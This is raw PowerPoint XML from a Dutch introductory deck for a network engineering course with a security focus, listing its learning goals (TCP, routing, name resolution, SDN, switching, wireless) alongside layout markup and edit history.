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51"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId6"/>
    <p:sldId id="258" r:id="rId7"/>
    <p:sldId id="259" r:id="rId8"/>
    <p:sldId id="260" r:id="rId9"/>
    <p:sldId id="262" r:id="rId10"/>
    <p:sldId id="263" r:id="rId11"/>
    <p:sldId id="265" r:id="rId12"/>
    <p:sldId id="266" r:id="rId13"/>
    <p:sldId id="269" r:id="rId14"/>
    <p:sldId id="271" r:id="rId15"/>
    <p:sldId id="293" r:id="rId16"/>
    <p:sldId id="272" r:id="rId17"/>
    <p:sldId id="292" r:id="rId18"/>
    <p:sldId id="29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67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68" r:id="rId37"/>
    <p:sldId id="294" r:id="rId38"/>
    <p:sldId id="295" r:id="rId39"/>
    <p:sldId id="296" r:id="rId40"/>
    <p:sldId id="297" r:id="rId41"/>
    <p:sldId id="300" r:id="rId42"/>
    <p:sldId id="298" r:id="rId43"/>
    <p:sldId id="299" r:id="rId44"/>
    <p:sldId id="301" r:id="rId45"/>
    <p:sldId id="302" r:id="rId46"/>
    <p:sldId id="303" r:id="rId47"/>
    <p:sldId id="304" r:id="rId48"/>
    <p:sldId id="290" r:id="rId49"/>
    <p:sldId id="270" r:id="rId50"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="7102475" cy="102346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0" autoAdjust="0"/>
    <p:restoredTop sz="94675"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="91" d="100"/>
          <a:sy n="91" d="100"/>
        </p:scale>
        <p:origin x="11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emen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}"/>
    <pc:docChg chg="delSld modSld">
      <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:03:08.606" v="55" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:12.146" v="13" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:07.599" v="12" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="256"/>
            <ac:spMk id="197" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:12.146" v="13" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="256"/>
            <ac:spMk id="201" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:25.992" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="257"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:38.121" v="25" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="259"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:38.121" v="25" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="259"/>
            <ac:spMk id="212" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:00:49.158" v="26" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="261"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:09.385" v="29" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="263"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:09.385" v="29" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="263"/>
            <ac:spMk id="230" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:23.505" v="30" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="264"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:40.891" v="46" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="265"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:40.891" v="46" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="265"/>
            <ac:spMk id="236" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:59.825" v="48" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="266"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:01:59.825" v="48" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="266"/>
            <ac:spMk id="239" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:03:08.606" v="55" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:02:18.637" v="54" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="940727218" sldId="293"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Tiemen Mink" userId="02c75056-c953-496c-b2d7-5759e7a9e3ca" providerId="ADAL" clId="{DA72E80C-D66D-4D7A-96EE-B4E209728831}" dt="2023-05-29T09:02:18.637" v="54" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="940727218" sldId="293"/>
            <ac:spMk id="2" creationId="{F4083153-C452-DC46-853E-68A381EECF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63C92-9A71-574E-9F6E-B7F572E015ED}" type="datetimeFigureOut">
              <a:rPr lang="nl-NL" smtClean="0"/>
              <a:t>29-5-2023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9CC0E-7F2E-0D48-8AA9-BCFBC59559B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332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9CC0E-7F2E-0D48-8AA9-BCFBC59559B6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458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D4BC43-ADBF-4990-B803-F713943FD0E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1EE9D9E-1689-463B-8336-9983205BB8E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032562B-0641-405E-8027-DE249A286A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54AE86-0182-4A40-AF6E-669E928D05A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F373C4-B3B4-4976-AD17-3BD458594D8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94428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3C94E0D-0785-4FF8-8F37-5690E719699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89D76D4-8D4D-4B16-9457-A14CB6C28D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B4D3370-F56A-4224-9CA2-E3F9B143510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6B57400-AE42-4CA9-BDA1-84986C45BB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499BDD8-308B-4F9F-A25B-F1D76751F00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1DD30A3-8177-4FFE-85FD-93572EE109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F571AA4-AA5E-41B9-8E72-1F97F79DF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34C7EA-C727-4A42-A08C-34D9E9F6D40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CE658CB-7661-4384-AB39-5357EAC39F0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843C2E4-CF7F-4CCF-A3E2-52E13DC6CD8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10FC337-5307-40CA-9B88-7182B8F1AEE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C192DD7-82B6-4689-BB1B-5415C1F935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94428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D7B6D8B-E729-4963-A82A-DB0895FF90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CAB6710-A69A-4CC5-9FD6-573EE7B7F64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F28168-AA96-4F96-83B9-0779D079A3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A2DD8ED-CA1A-46A4-8EDE-C331F5086E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8661D5A-1FF1-44E1-8B67-974CF502051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CFF1EC6-6FE3-4595-801F-31DB826DE70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0C09DC-24A7-4561-950C-852BAEA4225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9F707B1-7A35-40DD-A8CA-FB40344DA4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14456C2-A2B6-4F6D-B910-0FD0E861B7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836325E-905F-4DAE-BA89-2827B6FDF3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FC313F1-0F56-4C69-AB18-6284ADF0C7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F117E05-B49E-426C-A2B8-FAA9D81EA79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57200" y="94428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D5B6480-B3E6-4402-B664-627E159479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A643B16-9307-4822-8350-C40159845B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24C4763-F000-4B0A-BCA3-648D2B5088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51D6CE3-F4CB-4C77-89C7-BB2C9D69FB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71CE28-6C4D-4988-BC48-F368CB127C1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ED26B52-556C-43AB-B428-6124300A19B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23964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2208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45720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323964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602208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2724693-0468-4DC4-90A9-701656CAF7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67F121E-DB9E-4BB8-BD7B-DA399F7F913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703B50-DB0D-4218-A843-80B3DA8F95C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51DC01-B0DA-43E8-98E9-29D4A86513A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757172C-4F99-4D70-82B0-9F9021CBBD4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41D8532-A489-48F4-B967-E845706A1E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ubTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="94428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F70AED-ADDC-4B97-9EE6-DA0E0B18593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56D420-444C-4CE4-A8AE-9A8D231F96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011B166-49BD-4910-B740-A85A290C18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4A5218-D4F6-4AF1-9D7E-A650E994174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D3B9927-7F76-42AF-BAD7-1A5C29AAD11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924A988-FD69-4E6A-96D0-B0270896A0E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323964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02208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45720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6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323964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7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="602208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F19CF1F-D5AE-42E5-BC3D-63B38E2F71A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76FFD1A7-6F07-47C9-992F-988EDCC9AD0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703A61F6-50A9-4CF8-ABB6-EF84D974D49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3B4FB3AD-9802-49B4-BD04-A98C14C494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C53B17EB-7A5C-440E-ACCE-1719692FC87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E9BE300D-6514-4285-BDAF-7E9FEA4A254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ubTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="94428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40A7BEA3-A8FD-4774-B51E-09A0230072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7C2FBA5C-4B35-4A54-8FDF-37D0C0BB6BC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A453E282-6B81-44BE-BF47-0CE668254DE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B5FCAD7B-694D-4BB3-B45E-4521C899BB0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57200" y="4203000"/>
            <a:ext cx="822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763EA7F3-FAD2-446D-ABA6-84A27B153E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4674240" y="209988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45720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4674240" y="4203000"/>
            <a:ext cx="40158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5F224F82-C0DC-433C-B924-2D9A9785780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323964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>
          <a:xfrm>
            <a:off x="6022080" y="209988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body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="45720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6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323964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7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6022080" y="4203000"/>
            <a:ext cx="2649600" cy="192024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B288289A-7FD5-4A71-8AFB-24ECAB9A36F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Klik om de opmaak van de titeltekst te bewerken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Klik om de opmaak van de overzichtstekst te bewerken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="62856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Tweede overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="896760" lvl="2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Derde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1255680" lvl="3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Vierde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="4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Vijfde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="5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Zesde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="6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Zevende overzichtsniveau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56840" y="6124680"/>
            <a:ext cx="289548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898989"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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898989"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>Network Engineering 1 - Course introduction</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1"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254800" y="6124680"/>
            <a:ext cx="626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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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1BD2571-7A15-482D-96EC-4F29B9894C4A}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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Klik om de opmaak van de titeltekst te bewerken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Klik om de opmaak van de overzichtstekst te bewerken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="62856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Tweede overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="896760" lvl="2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Derde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1255680" lvl="3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Vierde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="4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Vijfde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="5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Zesde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="6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Zevende overzichtsniveau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sldNum" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8516880" y="6489720"/>
            <a:ext cx="62712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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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6C3E0D2-DF21-48A7-A4F3-14AFB66B5F64}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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Klik om de opmaak van de titeltekst te bewerken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Klik om de opmaak van de overzichtstekst te bewerken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="62856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Tweede overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="896760" lvl="2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Derde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1255680" lvl="3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Vierde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="4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Vijfde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="5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Zesde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="6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Zevende overzichtsniveau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ftr" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456840" y="6124680"/>
            <a:ext cx="289548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898989"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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898989"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>Network Engineering 1 - Course introduction</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1"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5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8254800" y="6124680"/>
            <a:ext cx="626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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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BEDF66C-E788-49BF-8BE7-5E2EF1B065F7}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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Klik om de opmaak van de titeltekst te bewerken</a:t>
            </a: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Klik om de opmaak van de overzichtstekst te bewerken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="62856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Tweede overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="896760" lvl="2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Derde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1255680" lvl="3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Vierde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="4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Vijfde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="5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Zesde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="6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Zevende overzichtsniveau</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8254800" y="6124680"/>
            <a:ext cx="626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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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E753313-371F-49E8-835A-FE8D6DB3FA43}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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94428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Klik om de opmaak van de titeltekst te bewerken</a:t>
            </a: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2099880"/>
            <a:ext cx="8229600" cy="40258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Klik om de opmaak van de overzichtstekst te bewerken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="628560" lvl="1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Tweede overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="896760" lvl="2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Derde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1255680" lvl="3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Vierde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="4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Vijfde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="5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Zesde overzichtsniveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1612800" lvl="6" indent="-2858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Zevende overzichtsniveau</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8254800" y="6124680"/>
            <a:ext cx="626760" cy="36504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nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle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CF49A3-2D2C-4BE4-93B6-81BB04C9FB14}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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1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perva.com/learn/application-security/syn-flood/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ethicalsecuritys.blogspot.com/2017/07/tcpip-hijacking.html" TargetMode="External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453960" y="1023840"/>
            <a:ext cx="7772400" cy="8128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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Networking Dag 4 - 6 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="CustomShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8516880" y="6489720"/>
            <a:ext cx="62712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AB85521-ECED-4A58-AADB-9D1FBEFB0641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1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Picture 10" descr="http://www.optinetsystems.com/wp-content/uploads/2013/05/network-management-edit.jpg"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2448000" y="1878120"/>
            <a:ext cx="6458040" cy="4736880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7878240" y="6095880"/>
            <a:ext cx="83448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</a:rPr>
              <a:t>Figuur 1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="TextShape 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="453960" y="1836720"/>
            <a:ext cx="2247840" cy="703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8255160" y="5996160"/>
            <a:ext cx="626760" cy="257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8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0C26CFC-082E-4561-85F8-9111EC629514}" type="slidenum">
              <a:rPr lang="nl-NL" sz="1300" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FBFCF8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:fld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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456840" y="2087640"/>
            <a:ext cx="7797960" cy="4038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Introductie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van het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vak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en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docenten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Leerdoelen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Studiemateriaal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Organisatie van het vak</a:t>
            </a:r>
          </a:p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Toetsing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="377640" indent="-37764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DLO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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8255160" y="6184080"/>
            <a:ext cx="626760" cy="24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6800" rIns="45720" bIns="468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strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FBFCF8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="944640"/>
            <a:ext cx="8229600" cy="1143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Agenda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74D2FB5-6D3D-404C-90E6-D1D1A093B198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3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Shape 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="9442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Doel van het vak</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="212" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456840" y="2087640"/>
            <a:ext cx="7797960" cy="4038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Vervolg op dag 1 - 3, zorg dus dat je die basis goed beheerst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Leren kennen van gevorderde thema’s op het gebied van computernetwerken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Veel aandacht voor beveiligingsrisico’s - en bescherming daar tegen - bij de behandelde onderwerpen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Met veel van die security issues gaan we ook zelf aan de slag in het practicum!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Een belangrijke stap in je ontwikkeling tot Cyber Security professional</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="213" name="CustomShape 4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BA060C6-FC32-4C03-88A0-159E0180D5CA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3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22D37B7-D53F-4914-915D-C145A13B9080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4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457200" y="7315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Leerdoelen - begrijpen van:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="TextShape 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1979640"/>
            <a:ext cx="8229600" cy="4038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Werking en beveiligingsaspecten van de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TCP verbinding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Werking en beveiligingsaspecten van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routing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 en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name resolution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Beheer van netwerken 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en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SDN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 (Software Defined Networking) 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Werking en beveiligingsaspecten van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adressering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 en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switching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 op de linklaag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Werking en beveiligingsaspecten van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draadloze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 netwerkverbindingen</a:t>
